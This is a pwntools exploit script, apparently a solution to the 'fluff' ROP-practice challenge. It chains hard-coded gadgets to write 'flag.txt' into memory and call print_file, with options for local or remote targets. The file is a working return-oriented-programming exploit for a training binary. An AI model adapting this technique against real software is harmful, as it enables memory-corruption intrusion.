from pwn import *

"""
Run locally with:
./exploit.py LOCAL
Run against remote with:
./exploit.py HOST=x.x.x.x PORT=xxxxx
"""

splash()
elf = context.binary = ELF("./fluff")

"""
    'x', 'g', 'a', '.'
    78   67   61   2E

    f  l  a  g  .  t  x  t
    66 6C 61 67 2E 74 78 74
"""

class ROP_Gadget:
    data_start = 0x0000000000601028
    print_file = 0x0000000000400510
    mov = 0x0000000000400606 # mov dword ptr [rbp + 0x48], edx; mov ebp, esp; call 0x500; mov eax, 0; pop rbp; ret; 
    pop_rbp = 0x0000000000400588
    pop_rdx_rcx = 0x000000000040062a # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
    trash = 0x1111111111111111
    flag = b"flagtrsh"
    txt = b".txttrsh"
    pop_rdi = 0x00000000004006a3
    ret = 0x0000000000400295


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    else:
        return remote(args.HOST, args.PORT)

def solve():
    io = conn()

    padding = cyclic(40)
    input("PAUSE...")

    payload = [
        padding,
        ROP_Gadget.pop_rbp,
        ROP_Gadget.data_start - 0x48,
        ROP_Gadget.pop_rdx_rcx,
        ROP_Gadget.flag,
        ROP_Gadget.trash,
        ROP_Gadget.ret,
        ROP_Gadget.mov,
        ROP_Gadget.data_start + 4 - 0x48,
        ROP_Gadget.pop_rdx_rcx,
        ROP_Gadget.txt,
        ROP_Gadget.trash,
        ROP_Gadget.ret,
        ROP_Gadget.mov,
        ROP_Gadget.trash,
        ROP_Gadget.pop_rdi,
        ROP_Gadget.data_start,
        ROP_Gadget.print_file
    ]

    io.sendline(flat(payload))
    io.sendline("\n")
    io.sendline("\n")
    io.interactive()


if __name__ == "__main__":
    solve()